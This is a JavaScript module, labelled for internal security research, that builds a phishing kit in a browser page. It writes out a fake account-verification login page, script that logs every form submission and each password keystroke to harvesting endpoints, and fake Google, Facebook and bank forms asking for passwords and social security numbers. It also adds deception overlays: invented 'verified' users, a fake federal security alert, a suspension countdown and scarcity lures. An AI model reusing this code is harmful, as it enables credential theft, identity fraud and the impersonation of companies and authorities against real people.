/**
 * SOCIAL ENGINEERING ATTACK MODULE
 * For Internal Security Research Only
 * 
 * This module demonstrates various social engineering techniques
 * including phishing pages, credential harvesting, and user manipulation.
 */

class SocialEngineeringAttack {
    constructor(page) {
        this.page = page;
        this.attackResults = {
            phishingAttempts: [],
            harvestedCredentials: [],
            userManipulation: [],
            socialProof: [],
            timestamp: new Date().toISOString()
        };
    }

    async executeSocialEngineeringAttacks() {
        console.log('🎭 Starting social engineering attacks...');
        
        await this.createPhishingPage();
        await this.implementCredentialHarvesting();
        await this.applySocialProofTechniques();
        await this.useAuthorityTechniques();
        await this.implementUrgencyTechniques();
        await this.createFakeLoginForms();
        await this.useScarcityTechniques();
        await this.implementReciprocityTechniques();
        
        return this.attackResults;
    }

    async createPhishingPage() {
        console.log('🎣 Creating phishing page...');
        
        const phishingPage = await this.page.evaluate(() => {
            // Create fake login page
            const fakeLogin = `
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Secure Login - Please Verify Your Account</title>
                    <style>
                        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
                        .login-container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                        .logo { text-align: center; margin-bottom: 30px; }
                        .logo img { width: 120px; height: auto; }
                        .form-group { margin-bottom: 20px; }
                        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
                        input[type="text"], input[type="password"], input[type="email"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
                        .btn { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
                        .btn:hover { background: #0056b3; }
                        .security-notice { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin-top: 20px; }
                        .security-notice h4 { margin: 0 0 10px 0; color: #856404; }
                        .security-notice p { margin: 0; color: #856404; font-size: 14px; }
                    </style>
                </head>
                <body>
                    <div class="login-container">
                        <div class="logo">
                            <h2>🔒 Secure Account Verification</h2>
                        </div>
                        <form id="phishingForm">
                            <div class="form-group">
                                <label for="email">Email Address</label>
                                <input type="email" id="email" name="email" required placeholder="Enter your email">
                            </div>
                            <div class="form-group">
                                <label for="password">Password</label>
                                <input type="password" id="password" name="password" required placeholder="Enter your password">
                            </div>
                            <div class="form-group">
                                <label for="confirmPassword">Confirm Password</label>
                                <input type="password" id="confirmPassword" name="confirmPassword" required placeholder="Confirm your password">
                            </div>
                            <button type="submit" class="btn">Verify Account</button>
                        </form>
                        <div class="security-notice">
                            <h4>⚠️ Security Alert</h4>
                            <p>We detected unusual activity on your account. Please verify your identity to prevent unauthorized access.</p>
                        </div>
                    </div>
                    <script>
                        document.getElementById('phishingForm').addEventListener('submit', function(e) {
                            e.preventDefault();
                            const formData = {
                                email: document.getElementById('email').value,
                                password: document.getElementById('password').value,
                                confirmPassword: document.getElementById('confirmPassword').value,
                                timestamp: new Date().toISOString(),
                                userAgent: navigator.userAgent,
                                url: window.location.href
                            };
                            
                            // Send to attacker server
                            fetch('/harvest-credentials', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(formData)
                            });
                            
                            // Show fake success message
                            alert('Account verified successfully! Thank you for your cooperation.');
                        });
                    </script>
                </body>
                </html>
            `;
            
            return fakeLogin;
        });

        // Navigate to phishing page
        await this.page.setContent(phishingPage);
        
        this.attackResults.phishingAttempts.push({
            type: 'fake_login_page',
            timestamp: new Date().toISOString(),
            description: 'Created fake login page with urgency messaging'
        });
    }

    async implementCredentialHarvesting() {
        console.log('🔑 Implementing credential harvesting...');
        
        await this.page.evaluate(() => {
            // Monitor all form submissions
            document.addEventListener('submit', function(e) {
                const form = e.target;
                const formData = new FormData(form);
                const data = {};
                
                for (let [key, value] of formData.entries()) {
                    data[key] = value;
                }
                
                // Add additional context
                data.timestamp = new Date().toISOString();
                data.url = window.location.href;
                data.userAgent = navigator.userAgent;
                data.referrer = document.referrer;
                
                // Send to harvesting endpoint
                fetch('/harvest-credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            });
            
            // Monitor password field changes
            document.addEventListener('input', function(e) {
                if (e.target.type === 'password') {
                    const passwordData = {
                        field: e.target.name || e.target.id,
                        value: e.target.value,
                        timestamp: new Date().toISOString(),
                        url: window.location.href
                    };
                    
                    // Send password data
                    fetch('/harvest-password', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(passwordData)
                    });
                }
            });
        });
        
        this.attackResults.harvestedCredentials.push({
            type: 'form_monitoring',
            timestamp: new Date().toISOString(),
            description: 'Implemented form submission and password field monitoring'
        });
    }

    async applySocialProofTechniques() {
        console.log('👥 Applying social proof techniques...');
        
        await this.page.evaluate(() => {
            // Create fake social proof elements
            const socialProof = document.createElement('div');
            socialProof.innerHTML = `
                <div style="position: fixed; top: 20px; right: 20px; background: white; border: 1px solid #ddd; padding: 15px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 1000;">
                    <h4 style="margin: 0 0 10px 0; color: #28a745;">✅ Recent Activity</h4>
                    <div style="font-size: 12px; color: #666;">
                        <div>👤 John D. verified 2 minutes ago</div>
                        <div>👤 Sarah M. verified 3 minutes ago</div>
                        <div>👤 Mike R. verified 5 minutes ago</div>
                        <div>👤 Lisa K. verified 7 minutes ago</div>
                    </div>
                </div>
            `;
            document.body.appendChild(socialProof);
            
            // Animate the notifications
            setInterval(() => {
                const notifications = socialProof.querySelectorAll('div');
                const randomNames = ['Alex P.', 'Emma W.', 'David L.', 'Maria S.', 'Tom H.', 'Anna B.'];
                const randomName = randomNames[Math.floor(Math.random() * randomNames.length)];
                
                const newNotification = document.createElement('div');
                newNotification.textContent = `👤 ${randomName} verified just now`;
                newNotification.style.fontSize = '12px';
                newNotification.style.color = '#666';
                
                socialProof.querySelector('div').appendChild(newNotification);
                
                // Remove old notifications
                if (notifications.length > 4) {
                    notifications[0].remove();
                }
            }, 8000);
        });
        
        this.attackResults.socialProof.push({
            type: 'fake_notifications',
            timestamp: new Date().toISOString(),
            description: 'Created fake social proof notifications'
        });
    }

    async useAuthorityTechniques() {
        console.log('👮 Using authority techniques...');
        
        await this.page.evaluate(() => {
            // Create authority-based messaging
            const authorityMessage = document.createElement('div');
            authorityMessage.innerHTML = `
                <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; border: 2px solid #dc3545; padding: 20px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); z-index: 1001; max-width: 400px;">
                    <div style="text-align: center; margin-bottom: 15px;">
                        <h3 style="color: #dc3545; margin: 0;">🚨 SECURITY ALERT</h3>
                    </div>
                    <p style="margin: 0 0 15px 0; font-size: 14px;">
                        <strong>Federal Security Department</strong> has detected suspicious activity on your account. 
                        Immediate verification is required to prevent account suspension.
                    </p>
                    <p style="margin: 0 0 15px 0; font-size: 12px; color: #666;">
                        <strong>Case ID:</strong> SEC-2024-${Math.floor(Math.random() * 10000)}<br>
                        <strong>Agent:</strong> Officer Johnson<br>
                        <strong>Department:</strong> Cyber Security Division
                    </p>
                    <div style="text-align: center;">
                        <button onclick="this.parentElement.parentElement.parentElement.remove()" style="background: #dc3545; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">I Understand - Proceed</button>
                    </div>
                </div>
            `;
            document.body.appendChild(authorityMessage);
        });
        
        this.attackResults.userManipulation.push({
            type: 'authority_technique',
            timestamp: new Date().toISOString(),
            description: 'Used fake authority messaging to create urgency'
        });
    }

    async implementUrgencyTechniques() {
        console.log('⏰ Implementing urgency techniques...');
        
        await this.page.evaluate(() => {
            // Create countdown timer
            const countdown = document.createElement('div');
            countdown.innerHTML = `
                <div style="position: fixed; top: 20px; left: 20px; background: #dc3545; color: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); z-index: 1002;">
                    <h4 style="margin: 0 0 10px 0;">⏰ Time Remaining</h4>
                    <div id="countdown" style="font-size: 24px; font-weight: bold;">05:00</div>
                    <div style="font-size: 12px; margin-top: 5px;">Account will be suspended</div>
                </div>
            `;
            document.body.appendChild(countdown);
            
            // Start countdown
            let timeLeft = 300; // 5 minutes
            const countdownElement = document.getElementById('countdown');
            
            const timer = setInterval(() => {
                timeLeft--;
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    countdownElement.textContent = '00:00';
                    countdown.style.background = '#6c757d';
                }
            }, 1000);
        });
        
        this.attackResults.userManipulation.push({
            type: 'urgency_technique',
            timestamp: new Date().toISOString(),
            description: 'Implemented countdown timer to create urgency'
        });
    }

    async createFakeLoginForms() {
        console.log('🔐 Creating fake login forms...');
        
        await this.page.evaluate(() => {
            // Create multiple fake login forms
            const fakeForms = [
                {
                    title: 'Google Account Security',
                    logo: '🔍',
                    fields: ['email', 'password', 'phone']
                },
                {
                    title: 'Facebook Security Check',
                    logo: '📘',
                    fields: ['email', 'password', 'security_code']
                },
                {
                    title: 'Bank Account Verification',
                    logo: '🏦',
                    fields: ['account_number', 'password', 'ssn']
                }
            ];
            
            fakeForms.forEach((form, index) => {
                const fakeForm = document.createElement('div');
                fakeForm.innerHTML = `
                    <div style="position: fixed; top: ${50 + index * 20}%; left: ${20 + index * 30}%; background: white; border: 1px solid #ddd; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 1003; max-width: 300px;">
                        <h3 style="margin: 0 0 15px 0; text-align: center;">${form.logo} ${form.title}</h3>
                        <form id="fakeForm${index}">
                            ${form.fields.map(field => `
                                <div style="margin-bottom: 15px;">
                                    <label style="display: block; margin-bottom: 5px; font-weight: bold;">${field.charAt(0).toUpperCase() + field.slice(1)}</label>
                                    <input type="${field === 'password' ? 'password' : 'text'}" name="${field}" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;" required>
                                </div>
                            `).join('')}
                            <button type="submit" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
                        </form>
                    </div>
                `;
                document.body.appendChild(fakeForm);
                
                // Handle form submission
                document.getElementById(`fakeForm${index}`).addEventListener('submit', function(e) {
                    e.preventDefault();
                    const formData = new FormData(e.target);
                    const data = {};
                    for (let [key, value] of formData.entries()) {
                        data[key] = value;
                    }
                    data.formType = form.title;
                    data.timestamp = new Date().toISOString();
                    
                    // Send to harvesting endpoint
                    fetch('/harvest-fake-form', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    
                    alert('Verification successful!');
                });
            });
        });
        
        this.attackResults.harvestedCredentials.push({
            type: 'fake_forms',
            timestamp: new Date().toISOString(),
            description: 'Created multiple fake login forms for different services'
        });
    }

    async useScarcityTechniques() {
        console.log('💎 Using scarcity techniques...');
        
        await this.page.evaluate(() => {
            // Create scarcity messaging
            const scarcityMessage = document.createElement('div');
            scarcityMessage.innerHTML = `
                <div style="position: fixed; bottom: 20px; right: 20px; background: #ffc107; border: 1px solid #e0a800; padding: 15px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 1004; max-width: 300px;">
                    <h4 style="margin: 0 0 10px 0; color: #856404;">🔥 Limited Time Offer</h4>
                    <p style="margin: 0 0 10px 0; font-size: 14px; color: #856404;">
                        Only <strong>3 spots remaining</strong> for premium account verification. 
                        Secure your account now before it's too late!
                    </p>
                    <div style="font-size: 12px; color: #856404;">
                        <div>✅ Premium security features</div>
                        <div>✅ 24/7 account monitoring</div>
                        <div>✅ Priority support access</div>
                    </div>
                </div>
            `;
            document.body.appendChild(scarcityMessage);
            
            // Update remaining spots
            let spotsLeft = 3;
            setInterval(() => {
                if (spotsLeft > 1) {
                    spotsLeft--;
                    scarcityMessage.querySelector('strong').textContent = `${spotsLeft} spots remaining`;
                }
            }, 15000);
        });
        
        this.attackResults.userManipulation.push({
            type: 'scarcity_technique',
            timestamp: new Date().toISOString(),
            description: 'Used scarcity messaging to create FOMO'
        });
    }

    async implementReciprocityTechniques() {
        console.log('🎁 Implementing reciprocity techniques...');
        
        await this.page.evaluate(() => {
            // Create reciprocity offer
            const reciprocityOffer = document.createElement('div');
            reciprocityOffer.innerHTML = `
                <div style="position: fixed; bottom: 20px; left: 20px; background: #28a745; color: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 1005; max-width: 300px;">
                    <h4 style="margin: 0 0 10px 0;">🎁 Free Security Upgrade</h4>
                    <p style="margin: 0 0 10px 0; font-size: 14px;">
                        We've upgraded your account security for FREE! 
                        Please verify your details to activate the new features.
                    </p>
                    <div style="font-size: 12px; margin-bottom: 10px;">
                        <div>🔒 Advanced encryption</div>
                        <div>🛡️ Fraud protection</div>
                        <div>📱 Mobile security</div>
                    </div>
                    <button onclick="this.parentElement.remove()" style="background: white; color: #28a745; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: bold;">Activate Now</button>
                </div>
            `;
            document.body.appendChild(reciprocityOffer);
        });
        
        this.attackResults.userManipulation.push({
            type: 'reciprocity_technique',
            timestamp: new Date().toISOString(),
            description: 'Used reciprocity to offer free security upgrade'
        });
    }

    getSummary() {
        return {
            totalAttacks: Object.keys(this.attackResults).length,
            phishingAttempts: this.attackResults.phishingAttempts.length,
            harvestedCredentials: this.attackResults.harvestedCredentials.length,
            userManipulation: this.attackResults.userManipulation.length,
            socialProof: this.attackResults.socialProof.length,
            timestamp: this.attackResults.timestamp
        };
    }
}

module.exports = SocialEngineeringAttack; 